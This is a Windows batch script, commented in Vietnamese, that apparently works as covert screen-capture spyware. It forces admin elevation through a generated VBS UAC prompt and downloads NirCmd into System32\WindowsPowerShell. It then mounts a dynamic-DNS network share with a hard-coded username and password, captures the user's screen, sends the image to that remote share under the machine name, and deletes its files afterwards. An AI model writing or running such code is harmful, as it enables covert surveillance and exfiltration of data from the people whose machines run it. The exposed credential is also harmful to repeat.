set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

echo Hello anh Dung Ha > "C:\Windows\System32\WindowsPowerShell\hehehe2.txt"
del /f /q "C:\Windows\System32\WindowsPowerShell\nircmd"
del /f /q C:\Windows\System32\WindowsPowerShell\nircmd.zip

:: Tải nircmd.zip từ trang web NirSoft
curl -L -o C:\Windows\System32\WindowsPowerShell\nircmd.zip https://www.nirsoft.net/utils/nircmd.zip

:: Giải nén nircmd.zip vào thư mục C:\nircmd
powershell -Command "Expand-Archive -Path 'C:\Windows\System32\WindowsPowerShell\nircmd.zip' -DestinationPath 'C:\Windows\System32\WindowsPowerShell\nircmd'"

:: Xóa file zip sau khi giải nén
del /f /q C:\Windows\System32\WindowsPowerShell\nircmd.zip

:: Kết nối đến chia sẻ mạng \\minhtuan283.ddns.net\hdd
net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002

:: Lấy tên máy tính bằng PowerShell
for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set DeviceName=%%i

:: Lấy ngày và giờ hiện tại
for /f "tokens=2 delims= " %%a in ('date /t') do set DATE=%%a
for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
set DATE=%DATE:/=-%
set TIME=%TIME::=-%

:: Đường dẫn lưu ảnh màn hình vào thư mục chia sẻ mạng
set ScreenshotPath=\\minhtuan283.ddns.net\hdd\serial\screenshot\%DeviceName%_%DATE%_%TIME%.png

:: Chụp màn hình và lưu vào đường dẫn đã chỉ định
"C:\Windows\System32\WindowsPowerShell\nircmd\nircmd.exe" savescreenshot "%ScreenshotPath%"


:: Ngắt kết nối chia sẻ mạng sau khi xong
net use \\minhtuan283.ddns.net\hdd /delete

:: Xóa các biến tạm
set DeviceName=
set DATE=
set TIME=
set ScreenshotPath=

echo Ảnh màn hình đã được lưu thành công tại %ScreenshotPath%
del /f /q C:\Windows\System32\WindowsPowerShell\nircmd
exit
